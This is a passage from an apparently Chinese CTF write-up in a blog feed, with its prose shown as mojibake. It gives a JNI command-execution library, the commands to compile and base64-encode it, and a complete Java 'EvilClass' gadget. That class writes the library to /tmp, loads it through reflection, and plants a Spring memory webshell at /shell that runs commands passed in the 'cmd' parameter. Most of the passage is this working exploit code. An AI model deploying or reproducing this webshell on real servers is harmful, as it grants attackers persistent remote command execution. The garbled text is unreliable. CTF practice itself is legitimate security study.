å®šä¹‰ä¸€ä¸ªå­˜æ”¾è¿”å›æ¶ˆæ¯çš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line">    <span class="built_in">strcat</span>(return_messge, result); <span class="comment">// å°†å‘½ä»¤æ‰§è¡Œç»“æœè¿½åŠ åˆ°è¿”å›æ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); <span class="comment">// åˆ›å»ºä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmdresult; <span class="comment">// è¿”å› Java å­—ç¬¦ä¸²ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jniè§„èŒƒ"><span id="jniè§„èŒƒ"> JNIè§„èŒƒ</span></h3><p><strong>JNIåŸå‹å‡½æ•°ï¼š</strong> JNIè§„èŒƒå®šä¹‰äº†ä¸€ç»„æ ‡å‡†çš„JNIå‡½æ•°åŸå‹ï¼Œå¦‚<code>GetStringUTFChars</code>ã€<code>ReleaseStringUTFChars</code>ç­‰ï¼Œä»¥æ–¹ä¾¿æ“ä½œå­—ç¬¦ä¸²ã€æ•°ç»„ã€å¼•ç”¨ç­‰å¸¸è§ä»»åŠ¡ã€‚</p><p><strong>JNIå‡½æ•°å‘½åè§„èŒƒï¼š</strong> JNIå‡½æ•°çš„å‘½åå¿…é¡»éµå¾ªç‰¹å®šçš„å‘½åè§„èŒƒï¼Œé€šå¸¸æ˜¯Javaç±»åï¼ˆç”¨ä¸‹åˆ’çº¿æ›¿ä»£ç‚¹å·ï¼‰åè·ŸJavaæ–¹æ³•åã€‚ä¾‹å¦‚ï¼ŒJavaç±»<code>com.example.MyClass</code>ä¸­çš„æ–¹æ³•<code>myNativeFunction</code>å¯¹åº”çš„JNIå‡½æ•°åº”ä¸º<code>Java_com_example_MyClass_myNativeFunction</code>ã€‚</p><p><strong>JNIEnvæŒ‡é’ˆï¼š</strong> JNIå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª<code>JNIEnv</code>æŒ‡é’ˆï¼Œå®ƒæ˜¯ä¸€ä¸ªå…³äºJNIç¯å¢ƒçš„ä¸Šä¸‹æ–‡ã€‚é€šè¿‡<code>JNIEnv</code>ï¼ŒJNIå‡½æ•°å¯ä»¥è®¿é—®Javaè™šæ‹Ÿæœºçš„å„ç§åŠŸèƒ½ï¼Œå¦‚å¯¹è±¡åˆ›å»ºã€æ–¹æ³•è°ƒç”¨å’Œå¼‚å¸¸å¤„ç†ã€‚</p><p><strong>æ•°æ®ç±»å‹è½¬æ¢ï¼š</strong> JNIå®šä¹‰äº†å„ç§æ•°æ®ç±»å‹çš„å¯¹åº”å…³ç³»ï¼Œä»¥ä¾¿Javaå’Œæœ¬åœ°ä»£ç ä¹‹é—´çš„æ•°æ®ä¼ é€’ã€‚ä¾‹å¦‚ï¼ŒJavaçš„<code>int</code>å¯¹åº”JNIçš„<code>jint</code>ï¼ŒJavaçš„<code>String</code>å¯¹åº”JNIçš„<code>jstring</code>ç­‰ã€‚JNIå‡½æ•°å…è®¸åœ¨è¿™äº›æ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</p><p>ä»å‚æ•°ä¸Šçœ‹:å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼š<code>JNIEnv *env</code>ï¼ˆJNI ç¯å¢ƒæŒ‡é’ˆï¼‰ã€<code>jclass class_object</code>ï¼ˆè¡¨ç¤º Java ç±»çš„ç±»å¯¹è±¡ï¼‰ã€<code>jstring jstr</code>ï¼ˆä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼‰ã€‚</p><p>é€šè¿‡ <code>(*env)-&gt;GetStringUTFChars</code> å‡½æ•°å°† Java å­—ç¬¦ä¸² <code>jstr</code> è½¬æ¢ä¸º C å­—ç¬¦ä¸² <code>cstr</code>ï¼Œè¿™æ˜¯å› ä¸º <code>execmd</code> å‡½æ•°éœ€è¦æ¥å— C å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚</p><p>ä¸­é—´æ‰§è¡Œå‘½ä»¤,å­˜å‚¨.</p><p>ä½¿ç”¨ <code>(*env)-&gt;NewStringUTF</code> å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ Java å­—ç¬¦ä¸² <code>cmdresult</code>ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯ã€‚</p><p>å°†ä¸¤éƒ¨åˆ†æ”¾åœ¨ä¸€èµ·,å½¢æˆcæ–‡ä»¶,ç„¶åç¼–è¯‘</p><p>ç¼–è¯‘:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.c</span><br><span class="line">base64 -w <span class="number">0</span> libcmd.so &gt; Evil.txt</span><br></pre></td></tr></table></figure><p>å†™æ–‡ä»¶çš„æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå†™ä¸ªloadçš„å†…å­˜ğŸ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.RandomAccessFile;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> <span class="title">extends</span> <span class="title">AbstractTranslet</span> &#123;</span></span><br><span class="line">    public <span class="type">static</span> native String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">    private <span class="type">static</span> final String EVIL_JNI_BASE64 = <span class="string">&quot;&quot;</span>;<span class="comment">//ğŸ‘´å°±ä¸æ”¾åœ¨è¿™é‡Œäº†,å¤ªé•¿äº†,è‡ªå·±ç”Ÿæˆ</span></span><br><span class="line">    private <span class="type">static</span> final String LIB_PATH = <span class="string">&quot;/tmp/libcmd.so&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);</span><br><span class="line">            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//è°ƒç”¨java.lang.ClassLoader$NativeLibraryç±»çš„loadæ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">            ClassLoader cmdLoader = EvilClass.class.getClassLoader();</span><br><span class="line">            Class&lt;?&gt; classLoaderClazz = Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; nativeLibraryClazz = Class.forName(<span class="string">&quot;java.lang.ClassLoader$NativeLibrary&quot;</span>);</span><br><span class="line">            Method load = nativeLibraryClazz.getDeclaredMethod(<span class="string">&quot;load&quot;</span>, String.class, boolean.class);</span><br><span class="line"></span><br><span class="line">            load.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Field field = classLoaderClazz.getDeclaredField(<span class="string">&quot;nativeLibraries&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);</span><br><span class="line">            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);</span><br><span class="line">            nativeLibraryCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line">            libs.addElement(nativeLibraryObj);</span><br><span class="line">            field.<span class="built_in">set</span>(cmdLoader, libs);</span><br><span class="line">            load.invoke(nativeLibraryObj, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//å†™å…¥å†…å­˜é©¬</span></span><br><span class="line">            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            Field configField = mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.BuilderConfiguration config =</span><br><span class="line">                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            Method method2 = EvilClass.class.getMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            RequestMappingInfo info = RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            EvilClass springControllerMemShell = new EvilClass();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != null) &#123;</span><br><span class="line">            String execRes = EvilClass.execCmd(cmd);</span><br><span class="line">            response.getWriter().write(execRes);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>NativeLibrary</code>åŒ…è£…åˆ°Vector,Vectoræ˜¯<code>Classloader</code>ä¸­<code>nativeLibraries</code>çš„å€¼,</p><p>ä¸€èˆ¬æ¥è¯´ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Command command = new Command();</span><br><span class="line">        String ipconfig = command.exec(<span class="string">&quot;ipconfig&quot;</span>);</span><br><span class="line">        System.out.println(ipconfig);</span><br></pre></td></tr></table></figure><p>é¢˜ç›®banäº†.</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106155628.png" alt="å¾®ä¿¡æˆªå›¾_20231106155628"></p><p>èŠœæ¹–,çœŸâˆšâ…§çˆ½,âˆšâ…§çœŸçˆ½,ç»ˆå‡ºäº†.</p><p>æéº»éº»åœ°,ğŸ‘´èŠ±äº†å‡ å¤©æ—¶é—´,å­¦äº†ä¸€å †ä¸œè¥¿.</p><p>æ€ä¹ˆåˆ¶ä½œé“¾å­,æ€ä¹ˆpythonå‘åŒ…,ğŸ‘´åœ¨å‰é¢å·²ç»åˆ†æè¿‡äº†.ä¸ç”¨é—®äº†ğŸ˜…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
